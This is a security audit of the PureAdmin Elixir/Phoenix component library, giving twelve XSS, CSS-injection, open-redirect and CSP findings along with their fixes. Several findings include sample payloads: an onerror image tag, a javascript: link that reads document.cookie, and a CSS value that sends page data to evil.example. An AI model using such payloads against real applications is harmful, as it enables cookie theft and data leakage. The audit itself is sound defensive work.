# PureAdmin Security Audit

**Scope:** `lib/keen_pure_admin/` (Elixir components and helpers) and `lib/assets/js/` (hooks + dialog system).
**Methodology:** Static review of every component and JS hook. Grep scans for known-dangerous patterns (`raw/1`, `innerHTML`, inline handlers, dynamic `style=`, open-redirect sinks, `eval`, `JSON.parse` of untrusted DOM reads). Cross-checked `attr` type declarations to confirm when user-supplied values can reach a dangerous sink.
**Trust model:** The audit assumes the Phoenix server is trusted; findings describe risks from (a) developer misuse and (b) malicious payloads if a component is handed user-controlled data without realising it crosses a trust boundary.
**Date:** 2026-04-24. Commit audited: `e57102b`.

> This document lists **risks and footguns**, not proven exploits in any given deployment. Every finding has a note on when it becomes actually exploitable.

---

## Summary

| # | Severity | Area | Title |
|---|----------|------|-------|
| 1 | High ✅ *fixed*    | `Components.Pager`                 | `raw/1` on `:icon_*` string attrs |
| 2 | High ✅ *fixed*    | `assets/js/hooks/flash.js`         | Markdown link URL (`$2`) not re-escaped inside `href=` |
| 3 | Medium ✅ *fixed*  | `Components.Popconfirm`            | `@id` interpolated into inline `onclick=` |
| 4 | Medium ✅ *fixed* | `Components.DataDisplay.desc_table`| `label_width` concatenated into `style=` |
| 5 | Medium ✅ *fixed* | `flash.js` / `toast.js`            | `JSON.stringify(action)` in `data-action` with weak attr escaping |
| 6 | Medium ✅ *fixed* | `assets/js/hooks/profile_panel.js` | `dataset.href` → `window.location.href` without scheme check |
| 7 | Low ✅ *fixed* | `Components.Typography.pa_link`, `Button.button`, `Layout.*` nav items | `href={@href}` accepts `javascript:` URLs |
| 8 | Low ✅ *fixed* | `assets/js/page-context.js`        | `JSON.parse` of hidden input, no schema validation |
| 9 | Low ✅ *fixed* | `assets/js/hooks/settings_panel.js`, `sidebar_resize.js` | `localStorage` → CSS class / `style.width` without validation |
| 10 | Low ✅ *fixed*    | `Components.Popconfirm`            | Inline `<script>` block duplicated per instance; CSP-hostile |
| 11 | Info ✅ *fixed*   | Library-wide                       | Inline `onclick=` handlers prevent strict CSP without `'unsafe-inline'` |
| 12 | Info ✅ *documented* | `assets/js/modal_dialogs.js`       | `custom()` dialog: caller-provided render function trusted |

Two High, four Medium, four Low, two Info. No remote-code-execution sinks. Every High/Medium finding requires either a malicious developer input or an already-compromised server payload — none are reachable from unauthenticated users of a correctly-wired consumer app. Still, each is a defense-in-depth improvement worth scheduling.

---

## Detailed findings

### 1. HIGH ✅ *fixed in v1.3.0* — `raw/1` on pager icon attrs

**Location:** `lib/keen_pure_admin/components/pager.ex:50-74`

```elixir
attr(:icon_first, :string, default: "&#171;", ...)
attr(:icon_previous, :string, default: "&#8249;", ...)
attr(:icon_next, :string, default: "&#8250;", ...)
attr(:icon_last, :string, default: "&#187;", ...)
...
<button ...><%= raw(@icon_first) %></button>
<button ...><%= raw(@icon_previous) %></button>
<button ...><%= raw(@icon_next) %></button>
<button ...><%= raw(@icon_last) %></button>
```

**Flow:** attr value → `Phoenix.HTML.raw/1` → template output (unescaped).

**Why `raw/1` was used:** the defaults are HTML entities (`&#171;`, `&#8249;`) which would display as literal `&#171;` if HEEx auto-escaped them. The library wants to allow entity strings, `<i class="fa-...">`, or inline SVG.

**Risk:** any caller that writes `<.pager icon_first={user.preferred_first_icon}>` — or binds the attr to a CMS field, translations file, DB column, etc. — gets arbitrary HTML execution in every page render. Rendering `<img src=x onerror=alert(1)>` via a user-supplied icon string is a full XSS.

**Mitigating factors:** most apps hardcode these icons. The attr is not commonly dynamic. But the docstring gives no warning, and the attr type is plain `:string`, so nothing blocks user input from reaching `raw/1`.

**Recommendation:**

- Convert `:icon_*` from a `:string` attr to a `:slot` so callers pass `<:icon_first>` markup that HEEx validates normally, and switch defaults to Unicode characters (`"«"`, `"‹"`, `"›"`, `"»"`) that don't need `raw/1`.
- Or — if keeping the attr — document the "you must pre-sanitize this" requirement, and provide a helper to wrap a Font Awesome icon name safely.

---

### 2. HIGH ✅ *fixed in v1.3.0* — Markdown link URL not re-escaped in `flash.js`

**Location:** `lib/assets/js/hooks/flash.js:195-202` (`_renderInline`)

```js
_renderInline(text) {
  let result = this._escapeHtml(text)            // step 1: escape all
  result = result.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
  result = result.replace(/\*(.+?)\*/g, '<em>$1</em>')
  result = result.replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2" class="pa-link">$1</a>')
  return result
}
```

**Flow:** server `push_flash(..., message: "[click](javascript:alert(1))")` → `_renderMarkdown` → `_renderInline` → regex replace → `innerHTML` on the alert element.

**Why it looks safe but isn't:** `_escapeHtml` runs first and turns `<`, `>`, `&`, `"` into entities. BUT: a URL like `javascript:alert(1)` contains none of those characters — it passes through `_escapeHtml` untouched, then ends up in `href="$2"` verbatim. Clicking the link executes arbitrary JS.

**Reproduction:** any LiveView that trusts user content in a flash message body is vulnerable. Example:

```elixir
push_flash(socket, "form", "info", "Check out [this page](javascript:alert(document.cookie))")
```

**Recommendation:** validate or sanitize the URL before inserting into `href`. Minimum: allow only `http:`, `https:`, `mailto:`, `tel:`, and relative paths; reject anything starting with `javascript:`, `data:`, `vbscript:`. Small helper:

```js
_safeUrl(url) {
  if (/^(javascript|data|vbscript):/i.test(url.trim())) return "#"
  return url.replace(/"/g, "&quot;")
}
```

…and apply it to `$2` before concatenation.

---

### 3. MEDIUM ✅ *fixed in v1.3.0 (by #10/#11 refactor)* — `@id` interpolated into inline `onclick=` in popconfirm

**Location:** `lib/keen_pure_admin/components/popconfirm.ex:65, 88, 96`

```elixir
onclick={"window.__paPopconfirmToggle(event, '#{@id}')"}
onclick={"window.__paPopconfirmClose('#{@id}'); return false;"}
```

**Flow:** developer-supplied `@id` → string interpolation into a JavaScript expression → attr → HEEx auto-escapes HTML special chars (`<`, `>`, `&`, `"`, `'`) and renders.

**Why it's partially mitigated:** HEEx escapes `'` in attr values to `&#39;`, and browsers decode that back to `'` before the JS parser sees it. That *does* neutralise a naive `id="foo'); alert(1); //"` when the attribute value is rendered via HEEx's attr interpolation — the single quote arrives at the JS parser as a literal `'`.

**Why it's still a concern:**
- The boundary is fragile. A future refactor that renders the attribute via `Phoenix.HTML.raw/1` (or via a JS hook that does `getAttribute("onclick")` and `eval`s it) would expose the hole.
- No validation is done on `@id` format. If it contains characters HEEx doesn't escape (like `\`, or a newline), the JS parser's handling becomes harder to reason about.
- The pattern encourages copy-paste elsewhere without the same defense.

**Recommendation:** replace the inline handler with event delegation using `data-*` attributes:

```elixir
<div class="pa-popconfirm-wrapper" data-popconfirm-toggle={@id}>
```

…then in the `<script>` shim attach a single document-level `click` listener that reads `target.closest('[data-popconfirm-toggle]')?.dataset.popconfirmToggle`. The value never touches the JS parser as code — only as a DOM string.

---

### 4. MEDIUM ✅ *fixed in v1.3.0* — `label_width` concatenated into `style=` in `desc_table`

**Location:** `lib/keen_pure_admin/components/data_display.ex:183-205`

```elixir
attr(:label_width, :string, default: nil, doc: "Custom label width CSS value")
...
def desc_table(assigns) do
  style = if assigns.label_width, do: "--label-width: #{assigns.label_width}", else: nil
  assigns = assign(assigns, :computed_style, style)
  ~H"""
  <div ... style={@computed_style}>
  ```

**Flow:** `label_width` attr → string concat → `style=` attribute.

**Risk:** a caller passing user-controlled text (e.g. `label_width={@user_preference}`) can inject arbitrary CSS. Modern browsers no longer execute JS from CSS (no `expression()`), but a malicious value like:

```
30%; background: url('https://evil.example/?c=' + document.title)
```

would:
1. Break out of the `--label-width` value.
2. Attach a `background: url(...)` that leaks page data on fetch.
3. Or inject CSS that covers the page with `position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: …`.

HEEx auto-escapes `"` inside the attribute, so the attacker can't close the `style=` attribute itself — but CSS-level injection within the attribute value is not blocked.

**Recommendation:** validate `label_width` as a CSS length (regex `^\d+(\.\d+)?(px|%|rem|em|vw|ch)$`), or switch to a separate attr like `:label_width_px, :integer` and build the string from a known-safe template.

---

### 5. MEDIUM ✅ *fixed in v1.3.0* — `JSON.stringify(action)` stored in `data-action` with weak escaping

**Location:** `lib/assets/js/hooks/flash.js:86`, `lib/assets/js/hooks/toast.js:66`

```js
contentHtml += `<button ... data-action="${this._escapeAttr(JSON.stringify(action))}">${this._escapeHtml(action.label || 'Action')}</button>`
```

…where `_escapeAttr` is:

```js
_escapeAttr(text) {
  return text.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
}
```

**Flow:** server `push_flash(actions: [%{label: "X", event: "...", params: %{...}}])` → JSON-stringified → weak attr escape → `innerHTML`.

**Risk:** `_escapeAttr` escapes only `&` and `"`. It does not escape `<` or `>`. If the JSON stringification produces content containing `<`, the browser's HTML parser may treat the surrounding markup unexpectedly when the template string is parsed by `innerHTML`. In practice, `JSON.stringify` doesn't produce `<` by default, and attribute context doesn't usually end at a `<`, but the escaping doesn't match standard attribute-safe escaping.

On retrieval (`JSON.parse(btn.dataset.action)`) the browser decodes entities before `dataset` returns the string, so the JSON parse succeeds for well-formed payloads. The risk is purely about HTML-parse-time confusion in pathological server payloads.

**Recommendation:** either
- Use `btn.textContent = action.label` and `btn._action = action` (closure / `addEventListener` captures the object directly, no attribute round-trip), or
- Use `.setAttribute('data-action', JSON.stringify(action))` on a freshly-created element (DOM setter does proper escaping) instead of string-concatenating into `innerHTML`.

---

### 6. MEDIUM ✅ *fixed in v1.3.0* — `profile_panel.js` navigates to unvalidated `dataset.href`

**Location:** `lib/assets/js/hooks/profile_panel.js:64`

**Flow:** template renders a favourite item with `data-href="..."`; JS reads `el.dataset.href` and does `window.location.href = value`.

**Risk:** If an app lets users save arbitrary URLs as favourites (and the library doesn't strip them), `data-href="javascript:fetch('/...')"` or `data-href="https://evil.example"` becomes a one-click open-redirect / self-XSS. Many apps would consider favourites user-controlled.

**Recommendation:** in the hook, check `new URL(value, location.origin).protocol` and reject anything outside `http:` / `https:`. Or convert the favourites renderer to real `<a href="...">` elements so Phoenix's / the app's own URL validation applies.

---

### 7. LOW ✅ *fixed in v1.3.0* — `href={@href}` across link/button/nav components

**Locations:**
- `components/typography.ex:69` (`pa_link/1`)
- `components/button.ex:64` (`button/1`)
- `components/layout.ex:171, 536` (navbar + sidebar items)
- `components/profile.ex:140` (`profile_nav_item/1`)

**Risk:** HEEx auto-escapes attribute values but does not validate URL schemes. A caller that binds `@href` to unsanitised user input enables `javascript:` / `data:` / `vbscript:` URLs. This is a Phoenix-wide pattern — not a library-specific flaw — but worth flagging for app authors.

**Recommendation:** document in the README's security section (once created) that URL attrs must be sanitised at the data boundary. Optionally: add a `PureAdmin.Helpers.safe_url/1` that returns `"#"` for dangerous schemes, encourage its use in examples.

---

### 8. LOW ✅ *fixed in v1.3.0* — `page-context.js` parses server JSON without schema validation

**Location:** `lib/assets/js/page-context.js:25`

**Flow:** `<input type="hidden" id="pa-page-context" value={@context_json}>` → `JSON.parse(el.value)` → cached and returned to any caller.

**Risk (low):** server is trusted, and the page context is re-rendered on every request. If a provider function crashes or returns bad shape, consumers might read `undefined` keys and inject them into the DOM. Not an exploit on its own — depends on what consumers do with the data.

**Recommendation:** keep a whitelist of expected keys and coerce each one to its expected type before returning from `getPageContext()`. At minimum, wrap `JSON.parse` in `try/catch` and log — currently a malformed JSON throws into the caller.

---

### 9. LOW ✅ *fixed in v1.3.0* — localStorage values used in CSS class / `style.width`

**Locations:**
- `lib/assets/js/hooks/settings_panel.js:237` — localStorage `color-variant` concatenated into class name template.
- `lib/assets/js/hooks/sidebar_resize.js:35` — `localStorage['pa-sidebar-width']` assigned to `sidebar.style.width`.

**Risk (low):** `classList.add(...)` is sandboxed — classes cannot execute JS. `element.style.width = "..."` is scoped to the `width` property (unlike `element.setAttribute("style", ...)`), so the attacker cannot inject arbitrary declarations. Bad input just renders weird.

**Residual risk:** an attacker who already has XSS on the origin can poison localStorage so that subsequent clean loads apply a weird layout, which might be chained with clickjacking. Defense-in-depth: validate against a known-good set before applying.

**Recommendation:** for `settings_panel.js`, check the stored value is in `FONT_SIZE_CLASSES` / `CONTAINER_WIDTH_CLASSES` / `COLOR_VARIANT_CLASSES` arrays before calling `classList.add`. For `sidebar_resize.js`, parse as integer and clamp to a sensible range before setting `style.width`.

---

### 10. LOW ✅ *fixed in v1.3.0* — Inline `<script>` block rendered per popconfirm instance

**Location:** `lib/keen_pure_admin/components/popconfirm.ex:103-` (the `<script :if={!assigns[:__popconfirm_script_loaded]}>` block)

**Issue:** the `:if` guard reads `assigns[:__popconfirm_script_loaded]` which isn't declared as an attr, so it's always `nil`, so `!nil` is always `true`, so every `<.popconfirm>` on the page emits a copy of the same ~80-line inline script. The runtime `if (window.__paPopconfirmToggle) return;` makes the second-onward copies no-ops, but each still requires `script-src 'unsafe-inline'` in CSP and adds N× duplicate nodes.

**Recommendation:** move the script to a dedicated JS hook / module exported from `lib/assets/js/hooks/popconfirm.js` and dropped via `PureAdminHooks`. Zero inline `<script>` tags. Bonus: removes the need for `'unsafe-inline'` on `script-src`.

---

### 11. INFO ✅ *fixed in v1.3.0* — Inline `onclick=` handlers block strict CSP

**Locations:**
- `components/badge.ex:275, 282` — expand/collapse handlers
- `components/data_display.ex:45, 51` — copy-to-clipboard buttons
- `components/navigation.ex:43, 49` — tab scroll buttons
- `components/popconfirm.ex:65, 88, 96` — already discussed in #3
- `components/tooltip.ex:103, 107, 114` — popover trigger/close

**Impact:** inline event handlers require `'unsafe-inline'` on CSP's `script-src-attr`, which weakens the policy globally. Apps that want strict CSP (`script-src 'self'`) cannot adopt PureAdmin without policy exceptions.

**Recommendation:** migrate each inline `onclick=` to a JS hook (`phx-hook` or event-delegated listener). The refactor is straightforward for the static handlers (no string interpolation); the popconfirm one is covered by #3/#10.

---

### 12. INFO ✅ *documented in v1.3.0* — `modal_dialogs.js custom()` trusts caller render function

**Location:** `lib/assets/js/modal_dialogs.js:320-366`

**Issue:** `PureAdmin.custom({render(container, close) { ... }})` lets the caller do `container.innerHTML = untrustedString`. The library itself does not escape — by design, because "custom" is the escape hatch.

**Risk:** not a vulnerability in the library, but callers who reach for `custom()` as a quick way to render user content will silently introduce XSS. The function's JSDoc doesn't warn.

**Recommendation:** add a "⚠ this container is yours — escape any user content you insert" note to the JSDoc.

---

## Areas verified clean

- No `System.cmd`, `:os.cmd`, `Code.eval_*`, `File.write`, or other host-reaching calls anywhere in `lib/keen_pure_admin/`.
- Only one `Phoenix.HTML.raw/1` usage (pager, finding #1). No other `raw/1`, no `{:safe, ...}` tuples, no `dangerously_set_inner_html` analogues.
- `data_viz.ex` style interpolations (`style={"--value: #{@value}%"}`) are safe because the attr type is `:integer` — HEEx refuses non-integers.
- `push_flash`/`push_toast` payloads round-trip through Phoenix's LiveView JSON encoder (JSON-safe escaping) and are decoded by `handleEvent` — no string-level concatenation between server and client.
- `Form.translate_error/1` and `PureAdmin.DateTime` do not build HTML; they return plain strings consumed by HEEx (auto-escaped at render).
- `page_context.ex` server side — JSON encoded with `Jason.encode!` and injected via HEEx-escaped attr; safe at the boundary. (JS-side risks are covered in #8.)
- `Command Palette`, `Detail Panel`, `Infinite Scroll`, `Tooltip`, `Checkbox`, `Char Counter`, `Sidebar`, `Sidebar Submenu` JS hooks — no `innerHTML` with untrusted data, no risky sinks.

---

## Recommendations by priority

**Before next release:**

1. Fix finding #2 (flash markdown link) — simple URL scheme check, clear XSS vector.
2. Fix finding #1 (pager icons) — switch to slots or Unicode defaults.

**Next minor:**

3. Address finding #3 (popconfirm inline onclick) by moving to a JS hook and eliminating finding #10 (duplicate inline `<script>`) at the same time.
4. Validate `label_width` in `desc_table` (finding #4) — either type it or regex-check.
5. Add URL-scheme validation helper (finding #7) and reference it from the README.

**Ongoing hardening:**

6. Migrate all remaining inline `onclick=` to hooks (finding #11) so the library becomes strict-CSP-compatible.
7. Strengthen `_escapeAttr` in flash/toast hooks to cover `<`/`>` too, or switch to DOM-setter-based attr assignment (finding #5).
8. Validate localStorage-sourced values against allowlists (finding #9).
9. Tighten `page-context.js` parsing (finding #8).
10. Documentation pass: add a `SECURITY.md` + README section enumerating which attrs accept raw HTML (`pager.icon_*`, `flash` markdown messages, etc.) so consumers know which boundaries to sanitise at.

---

## Threat-model reminder

None of the findings above are exploitable by an unauthenticated end-user against a correctly-written consumer app, because every one requires either:

- A developer wiring user-controlled data into an attr that's documented as trusted markup / CSS (`pager icon_*`, `desc_table label_width`, `typography.pa_link href`), or
- A server that pushes hostile content through `push_flash`/`push_toast` action/message payloads.

The fixes above raise the floor: they make the library harder to *accidentally* misuse. The highest-value improvement is converting the two High findings and the remaining inline-JS handlers, which unlocks strict CSP and closes the current "footgun" items.
